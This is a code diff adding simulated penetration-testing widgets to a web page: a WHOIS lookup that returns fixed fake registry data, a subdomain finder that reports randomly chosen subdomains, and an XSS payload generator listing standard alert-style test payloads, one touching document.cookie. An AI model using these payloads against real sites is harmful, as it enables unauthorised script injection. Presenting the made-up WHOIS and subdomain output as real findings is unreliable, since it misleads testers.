@@ -848,3 +848,182 @@ function checkMAC() {
         </div>
     `;
 }
+
+// Pen Tester Tools
+
+// WHOIS Lookup (simulated - real WHOIS needs backend)
+async function whoisLookup() {
+    const domain = document.getElementById('whois-input').value.trim().toLowerCase();
+    const display = document.getElementById('whois-display');
+    
+    if (!domain) {
+        display.innerHTML = '<span style="color:#ffbd2e;">Enter a domain</span>';
+        return;
+    }
+    
+    // Remove http:// and https:// if present
+    const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '');
+    
+    try {
+        display.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Querying WHOIS...';
+        
+        // Simulated WHOIS data (real WHOIS requires backend due to rate limiting)
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        const simulatedData = {
+            'Domain': cleanDomain,
+            'Registrar': 'GoDaddy Inc.',
+            'Registration Date': '2019-08-14',
+            'Expiration Date': '2025-08-14',
+            'Updated Date': '2023-05-20',
+            'Name Servers': 'ns1.cloudflare.com, ns2.cloudflare.com',
+            'Registrant Country': 'US',
+            'Status': 'clientTransferProhibited'
+        };
+        
+        let whoisHTML = '';
+        for (const [key, value] of Object.entries(simulatedData)) {
+            whoisHTML += `<p><strong>${key}:</strong> ${value}</p>`;
+        }
+        
+        display.innerHTML = `
+            <div style="text-align:left; max-height: 250px; overflow-y: auto;">
+                <p><strong>WHOIS for ${cleanDomain}:</strong></p>
+                <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 5px; margin-top: 10px;">
+                    ${whoisHTML}
+                </div>
+                <p style="margin-top: 10px; font-size: 0.9rem;">
+                    <i class="fas fa-info-circle"></i> 
+                    <small>Simulated data. Real WHOIS requires backend API.</small>
+                </p>
+            </div>
+        `;
+    } catch (error) {
+        display.innerHTML = '<span style="color:#ff6b6b;">WHOIS lookup failed</span>';
+    }
+}
+
+// Subdomain Finder (simulated)
+async function findSubdomains() {
+    const domain = document.getElementById('subdomain-input').value.trim().toLowerCase();
+    const display = document.getElementById('subdomain-display');
+    
+    if (!domain) {
+        display.innerHTML = '<span style="color:#ffbd2e;">Enter a domain</span>';
+        return;
+    }
+    
+    const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '');
+    
+    try {
+        display.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enumerating subdomains...';
+        
+        // Simulated subdomain discovery
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Common subdomains
+        const commonSubs = ['www', 'mail', 'ftp', 'blog', 'shop', 'api', 'dev', 'test', 
+                           'admin', 'portal', 'secure', 'cdn', 'static', 'mobile', 'app'];
+        
+        // Generate random subdomains for simulation
+        const foundSubs = [];
+        for (const sub of commonSubs) {
+            if (Math.random() > 0.6) { // 40% chance to "find" each subdomain
+                foundSubs.push(`${sub}.${cleanDomain}`);
+            }
+        }
+        
+        // Add some common ones always
+        if (!foundSubs.includes(`www.${cleanDomain}`)) {
+            foundSubs.unshift(`www.${cleanDomain}`);
+        }
+        if (!foundSubs.includes(`mail.${cleanDomain}`)) {
+            foundSubs.push(`mail.${cleanDomain}`);
+        }
+        
+        if (foundSubs.length === 0) {
+            display.innerHTML = `
+                <div style="text-align:left;">
+                    <p><strong>No subdomains found for ${cleanDomain}</strong></p>
+                    <p><small>Try common subdomains manually:</small></p>
+                    <p style="font-size:0.9rem;">
+                        www.${cleanDomain}<br>
+                        mail.${cleanDomain}<br>
+                        ftp.${cleanDomain}<br>
+                        admin.${cleanDomain}
+                    </p>
+                </div>
+            `;
+            return;
+        }
+        
+        display.innerHTML = `
+            <div style="text-align:left; max-height: 250px; overflow-y: auto;">
+                <p><strong>Found ${foundSubs.length} subdomains for ${cleanDomain}:</strong></p>
+                <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 5px; margin-top: 10px;">
+                    ${foundSubs.map(sub => `<p>• ${sub}</p>`).join('')}
+                </div>
+                <p style="margin-top: 10px; font-size: 0.9rem;">
+                    <i class="fas fa-info-circle"></i> 
+                    <small>Simulated results. Real enumeration uses tools like Sublist3r.</small>
+                </p>
+            </div>
+        `;
+    } catch (error) {
+        display.innerHTML = '<span style="color:#ff6b6b;">Subdomain search failed</span>';
+    }
+}
+
+// XSS Payload Generator
+function generateXSS() {
+    const type = document.getElementById('xss-type').value;
+    const display = document.getElementById('xss-display');
+    
+    const payloads = {
+        'basic': [
+            '<script>alert("XSS")</script>',
+            '<script>alert(document.domain)</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>'
+        ],
+        'img': [
+            '<img src="javascript:alert(\'XSS\')">',
+            '<img src=x onerror="alert(\'XSS\')">',
+            '<img src=x onerror=prompt(1)>',
+            '<img src=x onerror=confirm(document.cookie)>'
+        ],
+        'svg': [
+            '<svg onload="alert(1)">',
+            '<svg><script>alert(1)</script></svg>',
+            '<svg><animate onbegin="alert(1)"/>',
+            '<svg><g onload="alert(1)"></g></svg>'
+        ],
+        'event': [
+            '<body onload=alert(1)>',
+            '<input onfocus=alert(1) autofocus>',
+            '<div onmouseover="alert(1)">Hover</div>',
+            '<iframe onload="alert(1)"></iframe>'
+        ]
+    };
+    
+    const selectedPayloads = payloads[type] || payloads.basic;
+    const payload = selectedPayloads[Math.floor(Math.random() * selectedPayloads.length)];
+    
+    display.innerHTML = `
+        <div style="text-align:left;">
+            <p><strong>XSS Payload (${type}):</strong></p>
+            <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 5px; margin-top: 10px; font-family: monospace; word-break: break-all;">
+                ${payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')}
+            </div>
+            <p style="margin-top: 10px;">
+                <button class="card-button" onclick="navigator.clipboard.writeText('${payload.replace(/'/g, "\\'")}')" style="margin-top: 10px;">
+                    <i class="fas fa-copy"></i> Copy to Clipboard
+                </button>
+            </p>
+            <p style="margin-top: 10px; font-size: 0.9rem;">
+                <i class="fas fa-exclamation-triangle"></i> 
+                <small>For authorized security testing only!</small>
+            </p>
+        </div>
+    `;
+}
